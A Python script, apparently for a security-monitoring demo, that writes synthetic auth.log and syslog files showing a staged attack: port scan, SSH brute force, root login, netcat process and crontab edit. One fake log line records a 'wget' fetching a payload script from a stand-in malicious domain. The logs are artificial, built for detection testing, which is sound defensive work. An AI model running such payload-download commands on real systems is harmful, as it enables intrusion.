"""
scripts/generate_demo_logs.py

Generates realistic attack log files for demo purposes on a cloud server.
Simulates a complete attack chain:
  1. Port scan from 192.168.1.105
  2. SSH brute force (50+ attempts)
  3. Successful root login
  4. Privilege escalation attempt
  5. Malware process execution (netcat)
  6. Crontab modification

Run: python scripts/generate_demo_logs.py
"""

import os
import random
from datetime import datetime, timedelta

ATTACKER_IP  = "192.168.1.105"
SCANNER_IP   = "10.0.0.55"
LEGIT_IP     = "203.0.113.10"
USERNAMES    = ["root", "admin", "ubuntu", "user", "test", "oracle", "postgres"]

def rand_time(base: datetime, max_offset_seconds: int = 30) -> str:
    offset = timedelta(seconds=random.randint(0, max_offset_seconds))
    return (base + offset).strftime("%b %d %H:%M:%S")

def generate_auth_log(path: str):
    lines = []
    base  = datetime.now() - timedelta(hours=2)

    # ── Stage 1: Port scan ────────────────────────────────────────────────────
    for port in [22, 23, 80, 443, 3306, 5432, 6379, 8080, 8443, 9200]:
        t = rand_time(base, 5)
        lines.append(f"{t} server kernel: SYN from {SCANNER_IP} DPT={port}")
    base += timedelta(minutes=2)

    # ── Stage 2: SSH brute force (60 attempts) ────────────────────────────────
    for i in range(60):
        user = random.choice(USERNAMES)
        t    = rand_time(base, 2)
        lines.append(
            f"{t} server sshd[{1000+i}]: Failed password for {user} "
            f"from {ATTACKER_IP} port {22000+i} ssh2"
        )
        base += timedelta(seconds=random.randint(1, 3))

    # ── Stage 3: Successful root login ────────────────────────────────────────
    base += timedelta(minutes=1)
    t = rand_time(base, 2)
    lines.append(f"{t} server sshd[2001]: Accepted password for root from {ATTACKER_IP} port 51234 ssh2")

    # ── Stage 4: Privilege escalation attempt ────────────────────────────────
    base += timedelta(minutes=1)
    t = rand_time(base, 5)
    lines.append(f"{t} server sudo: www-data : FAILED ; TTY=pts/1 ; USER=root ; COMMAND=/bin/bash")

    # ── Stage 5: Authentication failure burst (mimics credential stuffing) ────
    for i in range(10):
        t = rand_time(base, 10)
        lines.append(f"{t} server sshd[2100]: authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost={ATTACKER_IP} user=root")
        base += timedelta(seconds=2)

    # ── Stage 6: Legitimate login for contrast ────────────────────────────────
    base += timedelta(minutes=5)
    t = rand_time(base, 2)
    lines.append(f"{t} server sshd[2200]: Accepted publickey for ubuntu from {LEGIT_IP} port 54321 ssh2")

    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "w") as f:
        f.write("\n".join(lines) + "\n")
    print(f"✅ auth.log generated → {path} ({len(lines)} lines)")


def generate_syslog(path: str):
    lines = []
    base  = datetime.now() - timedelta(hours=1)

    # ── Malware process execution ─────────────────────────────────────────────
    t = rand_time(base, 5)
    lines.append(f"{t} server kernel: [12345.678] process nc started by root")

    base += timedelta(minutes=2)
    t = rand_time(base, 5)
    lines.append(f"{t} server root: wget http://malicious-domain.xyz/payload.sh")

    # ── Crontab modification ──────────────────────────────────────────────────
    base += timedelta(minutes=3)
    t = rand_time(base, 2)
    lines.append(f"{t} server CRON[9999]: root edited crontab")
    lines.append(f"{t} server crontab[9999]: (root) BEGIN EDIT (root)")

    # ── Normal syslog noise ───────────────────────────────────────────────────
    base += timedelta(minutes=5)
    for msg in [
        "systemd[1]: Started Session 1 of user ubuntu.",
        "systemd[1]: Stopped Daily apt download activities.",
        "kernel: eth0: renamed from veth3a4b5c",
        "systemd-timesyncd[500]: Synchronized to time server 162.159.200.123:123"
    ]:
        t = rand_time(base, 30)
        lines.append(f"{t} server {msg}")
        base += timedelta(seconds=30)

    with open(path, "w") as f:
        f.write("\n".join(lines) + "\n")
    print(f"✅ syslog generated → {path} ({len(lines)} lines)")


if __name__ == "__main__":
    import tempfile

    log_dir   = tempfile.gettempdir()
    auth_path = os.path.join(log_dir, "auth.log")
    sys_path  = os.path.join(log_dir, "syslog")

    generate_auth_log(auth_path)
    generate_syslog(sys_path)

    print("\n📋 To use these in your demo, update the log paths in the Streamlit UI to:")
    print(f"   {auth_path},{sys_path}")
    print("\nOr on a real cloud server, leave as: /var/log/auth.log,/var/log/syslog")
